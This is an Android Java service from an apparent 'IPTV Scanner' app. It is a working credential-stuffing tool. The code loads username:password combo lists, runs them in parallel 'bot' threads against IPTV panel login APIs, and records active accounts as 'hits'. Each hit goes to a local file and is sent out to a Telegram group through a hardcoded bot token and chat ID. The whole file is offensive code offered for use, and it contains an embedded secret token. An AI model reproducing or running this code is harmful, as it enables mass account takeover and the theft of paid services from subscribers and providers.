package com.Scanner.IPTV;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import android.content.SharedPreferences;
import android.net.Uri;
import android.preference.PreferenceManager;
import androidx.documentfile.provider.DocumentFile;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class ScanService extends Service {

    public static final String CHANNEL_ID = "ScannerServiceChannel";
    private static final int NOTIFICATION_ID = 1;

    private ExecutorService executorService;
    private OkHttpClient httpClient;

    private List<String> panels;
    private List<String> combos;
    private List<String> proxies;
    private int speed;
    private File tempComboFile;
    private boolean useLargeFileMode = false;

    private AtomicInteger hitsCount = new AtomicInteger(0);
    private AtomicInteger failsCount = new AtomicInteger(0);
    private AtomicInteger processedCount = new AtomicInteger(0);
    private AtomicInteger totalCombos = new AtomicInteger(0);
    private boolean isRunning = false;
    private volatile boolean shouldStop = false;

    private static ScanListener listener;

    public interface ScanListener {
        void onHitFound(Hit hit);
        void onStatusUpdate(int hitCount, int failCount);
        void onProgressUpdate(int processed, int total, int botsActive);
        void onScanFinished(int hitCount, int failCount);
    }

    public static void setListener(ScanListener scanListener) {
        listener = scanListener;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        httpClient = new OkHttpClient();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            panels = intent.getStringArrayListExtra("panels");
            String comboFileUriString = intent.getStringExtra("combo_file_uri");
            speed = intent.getIntExtra("speed", 10);
            
            // Check if we have a temporary combo file (large file mode)
            String tempFilePath = intent.getStringExtra("temp_combo_file");
            if (tempFilePath != null) {
                tempComboFile = new File(tempFilePath);
                useLargeFileMode = true;
            }

            if (panels != null && !panels.isEmpty() && comboFileUriString != null) {
                startForeground(NOTIFICATION_ID, getNotification("Iniciando scan...", 0, 0));
                startScan(Uri.parse(comboFileUriString));
            } else {
                stopSelf();
            }
        }
        return START_NOT_STICKY;
    }

    private void startScan(Uri comboFileUri) {
        isRunning = true;
        shouldStop = false;
        hitsCount.set(0);
        failsCount.set(0);
        processedCount.set(0);
        totalCombos.set(0);
        
        // First, load all combos into memory
        new Thread(() -> {
            loadCombosAndStartScan(comboFileUri);
        }).start();
    }
    
    private void loadCombosAndStartScan(Uri comboFileUri) {
        try {
            if (useLargeFileMode && tempComboFile != null && tempComboFile.exists()) {
                // Large file mode - process directly from temp file
                startLargeFileProcessing();
            } else {
                // Small file mode - load to memory (original behavior)
                loadSmallFileToMemory(comboFileUri);
            }
        } catch (IOException e) {
            e.printStackTrace();
            stopScan();
        } catch (OutOfMemoryError e) {
            Log.e("ScanService", "OutOfMemoryError caught, attempting recovery");
            System.gc(); // Force garbage collection
            stopScan();
        }
    }
    
    private void loadSmallFileToMemory(Uri comboFileUri) throws IOException {
        List<String> allCombos = new ArrayList<>();
        
        // Load all combos from file
        InputStream inputStream = getContentResolver().openInputStream(comboFileUri);
        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream), 8192);
        String line;
        
        while ((line = reader.readLine()) != null && !shouldStop) {
            if (line.contains(":")) {
                allCombos.add(line.trim());
            }
        }
        reader.close();
        
        if (shouldStop) {
            return;
        }
        
        this.combos = allCombos;
        totalCombos.set(allCombos.size());
        
        // Now distribute work among bots
        distributeCombosAmongBots(allCombos);
    }
    
    private void startLargeFileProcessing() throws IOException {
        // Count total lines first
        BufferedReader lineCounter = new BufferedReader(new FileReader(tempComboFile));
        int totalLines = 0;
        while (lineCounter.readLine() != null && !shouldStop) {
            totalLines++;
        }
        lineCounter.close();
        
        if (shouldStop) {
            return;
        }
        
        totalCombos.set(totalLines);
        
        // Start file-based processing with bots
        distributeLargeFileAmongBots(totalLines);
    }
    
    private void distributeCombosAmongBots(List<String> allCombos) {
        if (allCombos.isEmpty()) {
            stopScan();
            return;
        }
        
        executorService = Executors.newFixedThreadPool(speed);
        
        // Calculate combos per bot
        int totalCombosCount = allCombos.size();
        int combosPerBot = Math.max(1, totalCombosCount / speed);
        
        // Distribute work among bots
        for (int botIndex = 0; botIndex < speed; botIndex++) {
            final int startIndex = botIndex * combosPerBot;
            final int endIndex = (botIndex == speed - 1) ? totalCombosCount : Math.min((botIndex + 1) * combosPerBot, totalCombosCount);
            
            if (startIndex >= totalCombosCount) {
                break; // No more work for this bot
            }
            
            final int currentBotIndex = botIndex + 1;
            
            executorService.submit(() -> {
                processComboRange(allCombos, startIndex, endIndex, currentBotIndex);
            });
        }
        
        startCompletionMonitor();
    }
    
    private void distributeLargeFileAmongBots(int totalLines) {
        if (totalLines == 0) {
            stopScan();
            return;
        }
        
        executorService = Executors.newFixedThreadPool(speed);
        
        // Calculate lines per bot
        int linesPerBot = Math.max(1, totalLines / speed);
        
        // Distribute work among bots
        for (int botIndex = 0; botIndex < speed; botIndex++) {
            final int startLine = botIndex * linesPerBot;
            final int endLine = (botIndex == speed - 1) ? totalLines : Math.min((botIndex + 1) * linesPerBot, totalLines);
            
            if (startLine >= totalLines) {
                break; // No more work for this bot
            }
            
            final int currentBotIndex = botIndex + 1;
            
            executorService.submit(() -> {
                processFileRange(startLine, endLine, currentBotIndex);
            });
        }
        
        startCompletionMonitor();
    }
    
    private void startCompletionMonitor() {
        // Monitor completion
        executorService.shutdown();
        new Thread(() -> {
            try {
                while (!executorService.isTerminated() && !shouldStop) {
                    Thread.sleep(1000);
                    updateNotification();
                }
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            
            if (!shouldStop) {
                stopScan();
            }
        }).start();
    }
    
    private void processComboRange(List<String> allCombos, int startIndex, int endIndex, int botIndex) {
        Log.d("ScanService", "Bot " + botIndex + " processing combos " + startIndex + " to " + endIndex);
        
        for (int i = startIndex; i < endIndex && !shouldStop; i++) {
            String combo = allCombos.get(i);
            
            if (combo.contains(":")) {
                String[] parts = combo.split(":", 2); // Limit split to 2 parts
                if (parts.length >= 2) {
                    String user = parts[0].trim();
                    String pass = parts[1].trim();
                    
                    // Check this combo against all panels
                    for (String panel : panels) {
                        if (shouldStop) break;
                        checkCombo(panel, user, pass, botIndex);
                    }
                }
            }
            
            processedCount.incrementAndGet();
            
            // Update progress every 10 combos to avoid too frequent updates
            if (i % 10 == 0) {
                updateNotification();
            }
        }
        
        Log.d("ScanService", "Bot " + botIndex + " finished processing range");
    }
    
    private void processFileRange(int startLine, int endLine, int botIndex) {
        Log.d("ScanService", "Bot " + botIndex + " processing file lines " + startLine + " to " + endLine);
        
        try (BufferedReader reader = new BufferedReader(new FileReader(tempComboFile), 16384)) {
            
            // Skip to start line efficiently
            for (int i = 0; i < startLine && !shouldStop; i++) {
                if (reader.readLine() == null) {
                    Log.w("ScanService", "Bot " + botIndex + " reached end of file before start line");
                    return;
                }
            }
            
            // Process assigned range
            int processedInRange = 0;
            String combo;
            while ((combo = reader.readLine()) != null && !shouldStop && (startLine + processedInRange) < endLine) {
                
                if (combo.contains(":")) {
                    String[] parts = combo.split(":", 2);
                    if (parts.length >= 2) {
                        String user = parts[0].trim();
                        String pass = parts[1].trim();
                        
                        // Check this combo against all panels
                        for (String panel : panels) {
                            if (shouldStop) break;
                            checkCombo(panel, user, pass, botIndex);
                        }
                    }
                }
                
                processedCount.incrementAndGet();
                processedInRange++;
                
                // Update progress every 50 combos to reduce overhead
                if (processedInRange % 50 == 0) {
                    updateNotification();
                }
            }
            
        } catch (IOException e) {
            Log.e("ScanService", "Bot " + botIndex + " - Error reading file: " + e.getMessage());
        }
        
        Log.d("ScanService", "Bot " + botIndex + " finished processing file range");
    }

    private void stopScan() {
        shouldStop = true;
        isRunning = false;
        
        if (executorService != null && !executorService.isShutdown()) {
            executorService.shutdownNow();
            try {
                if (!executorService.awaitTermination(5, java.util.concurrent.TimeUnit.SECONDS)) {
                    Log.w("ScanService", "Executor did not terminate gracefully");
                }
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }
        
        // Clean up temporary file if exists
        if (tempComboFile != null && tempComboFile.exists()) {
            try {
                if (tempComboFile.delete()) {
                    Log.d("ScanService", "Temporary combo file deleted successfully");
                } else {
                    Log.w("ScanService", "Failed to delete temporary combo file");
                }
            } catch (Exception e) {
                Log.e("ScanService", "Error deleting temporary combo file: " + e.getMessage());
            }
        }
        
        if (listener != null) {
            listener.onScanFinished(hitsCount.get(), failsCount.get());
        }
        
        stopForeground(true);
        stopSelf();
    }

    private void checkCombo(String panel, String user, String pass, int botIndex) {
        try {
            String urlBase = String.format("http://%s/player_api.php?username=%s&password=%s&type=m3u",
                    panel, user, pass);
            String fetchUrl = urlBase;

            // Implementar lógica de proxy aqui se necessário
            // Por simplicidade, esta implementação não usa proxy real, apenas simula
            // if (proxies != null && !proxies.isEmpty()) {
            //     String proxy = getNextProxy(); // Implementar lógica para obter próximo proxy
            //     fetchUrl = String.format("http://%s/proxy?url=%s", proxy, URLEncoder.encode(urlBase, "UTF-8"));
            // }

            Request request = new Request.Builder().url(fetchUrl).build();
            Response response = httpClient.newCall(request).execute();

            if (response.isSuccessful() && response.body() != null) {
                String responseBody = response.body().string();
                JSONObject jsonResponse = new JSONObject(responseBody);

                if (jsonResponse.has("user_info")) {
                    JSONObject userInfo = jsonResponse.getJSONObject("user_info");
                    if ("Active".equals(userInfo.getString("status"))) {
                        String expDate = userInfo.has("exp_date") ?
                                new java.text.SimpleDateFormat("dd/MM/yyyy HH:mm:ss").format(new java.util.Date(userInfo.getLong("exp_date") * 1000)) :
                                "Ilimitado";
                        String activeCons = userInfo.has("active_cons") ? userInfo.getString("active_cons") : "?";

                        String port = "80";
                        if (panel.contains(":")) {
                            port = panel.split(":")[1];
                        }
                        Hit hit = new Hit(user, pass, panel, expDate, activeCons, port);
                        hitsCount.incrementAndGet();
                        
                        Log.i("ScanService", "Bot " + botIndex + " encontrou HIT: " + user + ":" + pass + " em " + panel);
                        
                        if (listener != null) {
                            listener.onHitFound(hit);
                        }
                        saveHitToFile(hit, panel);
                        sendToTelegram(hit);
                    } else {
                        failsCount.incrementAndGet();
                    }
                } else {
                    failsCount.incrementAndGet();
                }
            } else {
                failsCount.incrementAndGet();
            }
        } catch (IOException | JSONException e) {
            failsCount.incrementAndGet();
            Log.e("ScanService", "Bot " + botIndex + " - Erro ao verificar combo " + user + ":" + pass + " em " + panel + ": " + e.getMessage());
        }
    }
    
    // Método de compatibilidade para chamadas antigas
    private void checkCombo(String panel, String user, String pass) {
        checkCombo(panel, user, pass, 0);
    }

    private void sendToTelegram(Hit hit) {
        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
        boolean telegramEnabled = prefs.getBoolean("telegram_enabled", true);
        if (!telegramEnabled) {
            return;
        }

        String botToken = prefs.getString("telegram_bot_token", "8245169261:AAHTUygk3X99DtXysRwkPcjM7cYo0-FNpcQ");
        String groupId = prefs.getString("telegram_group_id", "-1002710854837");
        String message = hit.getFormattedText();

        try {
            String url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + groupId + "&text=" + java.net.URLEncoder.encode(message, "UTF-8");
            Request request = new Request.Builder().url(url).build();
            httpClient.newCall(request).execute();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void saveHitToFile(Hit hit, String panel) {
        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
        String directoryUriString = prefs.getString("hits_directory", null);
        if (directoryUriString == null) {
            return;
        }

        Uri directoryUri = Uri.parse(directoryUriString);
        DocumentFile directory = DocumentFile.fromTreeUri(this, directoryUri);

        if (directory != null && directory.exists() && directory.isDirectory()) {
            String fileName = panel.replaceAll("[^a-zA-Z0-9.-]", "_") + ".txt";
            DocumentFile file = directory.findFile(fileName);
            if (file == null) {
                file = directory.createFile("text/plain", fileName);
            }

            try (OutputStream os = getContentResolver().openOutputStream(file.getUri(), "wa")) {
                if (os != null) {
                    os.write((hit.getFormattedText() + "\n\n").getBytes());
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    getString(R.string.notification_channel_name),
                    NotificationManager.IMPORTANCE_LOW
            );
            serviceChannel.setDescription(getString(R.string.notification_channel_desc));
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(serviceChannel);
        }
    }

    private android.app.Notification getNotification(String text, int progress, int max) {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0,
                notificationIntent, PendingIntent.FLAG_IMMUTABLE);

        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle(getString(R.string.notification_title))
                .setContentText(text)
                .setSmallIcon(R.mipmap.ic_launcher)
                .setContentIntent(pendingIntent)
                .setOngoing(true);

        if (max > 0) {
            builder.setProgress(max, progress, false);
        } else {
            builder.setProgress(0, 0, true); // Indeterminate progress
        }
        return builder.build();
    }

    private void updateNotification() {
        NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        int totalCombosCount = totalCombos.get();
        int currentProgress = processedCount.get();
        
        // Create more detailed status text
        String statusText;
        if (totalCombosCount > 0) {
            int progressPercent = (currentProgress * 100) / totalCombosCount;
            statusText = String.format("Progresso: %d%% | Hits: %d | Falhas: %d | Bots: %d", 
                progressPercent, hitsCount.get(), failsCount.get(), speed);
        } else {
            statusText = getString(R.string.notification_text, hitsCount.get(), failsCount.get());
        }
        
        notificationManager.notify(NOTIFICATION_ID, getNotification(statusText, currentProgress, totalCombosCount));

        if (listener != null) {
            listener.onStatusUpdate(hitsCount.get(), failsCount.get());
            listener.onProgressUpdate(currentProgress, totalCombosCount, speed);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopScan();
        Log.d("ScanService", "Service destroyed");
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}

